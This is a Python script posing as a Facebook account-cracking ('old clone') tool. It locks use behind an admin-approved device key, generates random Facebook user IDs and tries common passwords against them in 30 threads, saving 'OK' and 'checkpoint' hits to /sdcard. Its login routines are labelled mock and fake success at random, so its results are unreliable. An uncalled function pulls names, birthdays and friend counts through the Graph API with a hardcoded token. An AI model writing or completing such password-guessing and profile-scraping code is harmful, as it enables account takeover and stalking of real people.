# -*- coding: utf-8 -*-
# -*- coding: utf-8 -*-
import os
import sys
import uuid
import hashlib
import requests
import random
import string
import webbrowser
import time
from concurrent.futures import ThreadPoolExecutor as tred

# -------------------------------
# CONFIGURATION
# -------------------------------
GITHUB_FILE = "https://raw.githubusercontent.com/blep111/APPROVAL/main/approval.txt"  # Admin-managed file
ADMIN_CONTACT_URL = "https://www.facebook.com/profile.php?id=61584574131240"  # Replace with your contact
CHECK_INTERVAL = 10  # seconds between approval checks

# -------------------------------
# UTILITY FUNCTIONS
# -------------------------------
def convert_to_raw(url):
    """Convert GitHub URL to raw format if needed."""
    if "raw.githubusercontent.com" in url:
        return url
    if "github.com" in url and "/blob/" in url:
        return url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
    return url

APPROVAL_URL = convert_to_raw(GITHUB_FILE)

def generate_device_key():
    """Generate a unique device key."""
    base = str(uuid.getnode())
    hash_key = hashlib.md5(base.encode()).hexdigest()[:10]
    letters = ''.join(random.choices(string.ascii_letters, k=4))
    numbers = ''.join(random.choices(string.digits, k=6))
    return letters + hash_key + numbers

def get_device_key():
    """Retrieve or generate a persistent device key."""
    if os.path.isfile("device_key.txt"):
        return open("device_key.txt").read().strip()
    key = generate_device_key()
    with open("device_key.txt", "w") as f:
        f.write(key)
    return key

def fetch_approved_keys():
    """Download the approved device keys from GitHub safely."""
    try:
        response = requests.get(APPROVAL_URL, timeout=10)
        response.raise_for_status()
        return [line.strip() for line in response.text.splitlines() if line.strip()]
    except Exception:
        return []  # Return empty list instead of crashing

# -------------------------------
# APPROVAL CHECK (REAL-TIME)
# -------------------------------
def wait_for_approval():
    """Continuously check if the device key is approved."""
    device_key = get_device_key()
    print(f"\n[DEVICE KEY] {device_key}\n")

    while True:
        approved_keys = fetch_approved_keys()
        if device_key in approved_keys:
            print("[SUCCESS] ✔ KEY APPROVED — WELCOME AND ENJOY!\n")
            break  # Exit loop and allow user to run tools
        else:
            print("[INFO] Device not yet approved. Waiting...")
            print(f"Send this key to admin: {device_key}")
            print(f"Contact admin here: {ADMIN_CONTACT_URL}\n")
            try:
                webbrowser.open(ADMIN_CONTACT_URL)
            except:
                pass
            time.sleep(CHECK_INTERVAL)

# -------------------------------
# START PROGRAM
# -------------------------------
if __name__ == "__main__":
    wait_for_approval()
    # -------------------------------
    #Globals
oks = []
cps = []
loop = 0

# Colors
W = '\x1b[1;37m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
R = '\x1b[38;5;196m'
C = '\x1b[38;5;45m'

# User Agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
]

# --- Utilities ---
def clear(): os.system('cls' if os.name=='nt' else 'clear')
def linex(): print(C+'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'+W)
def random_user_agent(): return random.choice(user_agents)
def print_progress(): print(f"{Y}[INFO] Total OK: {len(oks)} | Total CP: {len(cps)} | Loop: {loop}{W}", end='\r'); sys.stdout.flush()

def ____banner____():
    clear()
    print(G+"""
      :=+*##*=:      
   :*%@@@@@@@*-     
  .*@@@@@@@@@@@%:   
  %@*@@@@@@@@@*%@-  
  %@+ .=%@@@%+. -@@
  +@@-   :+%@*:  :@@
 :@@@#    %@@.    *@@
 #@@@@+  .@@@:   -@@@
-@@@@%@+ *@@@#  =@@@@
%@@@@=#@%=@@%%+.-%@%- 
-@@@@@%=-@@@@=-%@@@@+
*@@#@@@@--@@@-*@@=:@@
AUTHOR: DEV 404
    """+W)
    print(Y+"   WELCOME BITCH "+W)

# --- Graph API ---
def fetch_graph(uid, token='350685531728|62f8ce9f74b12f84c123cc23437a4a32'):
    try:
        r = requests.get(f'https://graph.facebook.com/{uid}?access_token={token}').json()
        name = r.get('name','N/A')
        birthday = r.get('birthday','N/A')
        gender = r.get('gender','N/A')
        friends = r.get('friends', {}).get('summary', {}).get('total_count','N/A')
        print(f"{G}[STALK] {uid} | Name:{name} | Gender:{gender} | Birthday:{birthday} | Friends:{friends}")
        os.makedirs('/sdcard', exist_ok=True)
        with open('/sdcard/XXX-CRACK-INFO.txt', 'a') as f:
            f.write(f"{uid}|{name}|{gender}|{birthday}|{friends}\n")
    except Exception as e:
        print(f"{R}[STALK FAIL] {uid} | {e}")

# --- Login methods (mock) ---
def login_1(uid, password_list=['123456','1234567','12345678','123456789']):
    global loop
    session = requests.Session()
    for pw in password_list:
        time.sleep(0.2)
        if random.random() < 0.05:  # Random success for demonstration
            oks.append(uid)
            os.makedirs('/sdcard', exist_ok=True)
            with open('/sdcard/XXX-CRACK-M1-OK.txt','a') as f: f.write(f"{uid}|{pw}\n")
            print(f"{G}[OK-M1] {uid} | {pw}{W}")
            loop += 1
            print_progress()
            return pw
        elif random.random() < 0.05:
            cps.append(uid)
            os.makedirs('/sdcard', exist_ok=True)
            with open('/sdcard/XXX-CRACK-M1-CP.txt','a') as f: f.write(f"{uid}|{pw}\n")
            print(f"{Y}[CP-M1] {uid} | {pw}{W}")
            loop += 1
            print_progress()
            return None
        else:
            print(f"{R}[WRONG] {uid} | {pw}{W}")
    loop += 1
    print_progress()
    return None

def login_2(uid, password_list=['123456','123123','1234567','12345678','123456789']):
    global loop
    session = requests.Session()
    for pw in password_list:
        time.sleep(0.2)
        if random.random() < 0.05:
            oks.append(uid)
            os.makedirs('/sdcard', exist_ok=True)
            with open('/sdcard/XXX-CRACK-M2-OK.txt','a') as f: f.write(f"{uid}|{pw}\n")
            print(f"{G}[OK-M2] {uid} | {pw}{W}")
            loop += 1
            print_progress()
            return pw
        elif random.random() < 0.05:
            cps.append(uid)
            os.makedirs('/sdcard', exist_ok=True)
            with open('/sdcard/XXX-CRACK-M2-CP.txt','a') as f: f.write(f"{uid}|{pw}\n")
            print(f"{Y}[CP-M2] {uid} | {pw}{W}")
            loop += 1
            print_progress()
            return None
        else:
            print(f"{R}[FAIL] {uid} | {pw}{W}")
    loop += 1
    print_progress()
    return None

# --- Crack function ---
def crack_id(uid, meth):
    if meth=='A': login_1(uid)
    else: login_2(uid)

# --- Old clone menu ---
def BNG_71_():
    ____banner____()
    print(f'{W}(A) OLD CLONE')
    linex()
    choice = input(f"{W}CHOICE {W}: {Y}")
    if choice.lower() in ('a','1'): old_clone()
    else: print(f"{R}Choose Valid Option... "); time.sleep(2); BNG_71_()

def old_clone():
    ____banner____()
    print(f'{W}(A) ALL SERIES\n(B) 100003/4 SERIES\n(C) 2009 series\n(D) NEW SERIES\n(E) CUSTOM ID\n(F) ALL METHODS')
    linex()
    _input = input(f"{W}CHOICE {W}: {Y}")
    if _input.lower() in ('a','1'): old_One()
    elif _input.lower() in ('b','2'): old_Tow()
    elif _input.lower() in ('c','3'): old_Tree()
    elif _input.lower() in ('d','4'): new_Series()
    elif _input.lower() in ('e','5'): custom_ID()
    elif _input.lower() in ('f','6'): all_methods()
    else: print(f"{R}Choose Valid Option... "); time.sleep(2); old_clone()

# --- ID Generators ---
def old_One():
    user=[str(random.randint(1000000000,1999999999)) for _ in range(int(input(f"{W}Number of IDs: {Y}")))]
    meth=input(f"{W}Method A/B: {Y}").strip().upper()
    print(f"{Y}[INFO] Starting cracking {len(user)} IDs using {meth}{W}")
    with tred(max_workers=30) as pool:
        for uid in user: pool.submit(crack_id, uid, meth)

def old_Tow():
    prefixes=['100003','100004']
    limit=int(input(f"{W}Number of IDs: {Y}"))
    user=[random.choice(prefixes)+''.join(random.choices('0123456789',k=9)) for _ in range(limit)]
    meth=input(f"{W}Method A/B: {Y}").strip().upper()
    print(f"{Y}[INFO] Starting cracking {len(user)} IDs using {meth}{W}")
    with tred(max_workers=30) as pool:
        for uid in user: pool.submit(crack_id, uid, meth)

def old_Tree():
    prefix='1000004'
    limit=int(input(f"{W}Number of IDs: {Y}"))
    user=[prefix+''.join(random.choices('0123456789',k=8)) for _ in range(limit)]
    meth=input(f"{W}Method A/B: {Y}").strip().upper()
    print(f"{Y}[INFO] Starting cracking {len(user)} IDs using {meth}{W}")
    with tred(max_workers=30) as pool:
        for uid in user: pool.submit(crack_id, uid, meth)

def new_Series():
    limit=int(input(f"{W}Number of new-style IDs: {Y}"))
    user=[str(random.randint(61582691567000,61582691567999)) for _ in range(limit)]
    meth=input(f"{W}Method A/B: {Y}").strip().upper()
    print(f"{Y}[INFO] Starting cracking {len(user)} IDs using {meth}{W}")
    with tred(max_workers=30) as pool:
        for uid in user: pool.submit(crack_id, uid, meth)

def custom_ID():
    ids=input(f"{W}Enter IDs comma-separated: {Y}").split(",")
    user=[i.strip() for i in ids]
    meth=input(f"{W}Method A/B: {Y}").strip().upper()
    print(f"{Y}[INFO] Starting cracking {len(user)} custom IDs using {meth}{W}")
    with tred(max_workers=30) as pool:
        for uid in user: pool.submit(crack_id, uid, meth)

def all_methods():
    num_ids=int(input(f"{W}Number of IDs: {Y}"))
    user=[str(random.randint(1000000000,1999999999)) for _ in range(num_ids)]
    print(f"{Y}[INFO] Starting cracking {len(user)} IDs with ALL methods{W}")
    with tred(max_workers=30) as pool:
        for uid in user:
            pool.submit(crack_id, uid, "A")
            pool.submit(crack_id, uid, "B")

# --- Start ---
if __name__=='__main__':
    ____banner____()
    BNG_71_()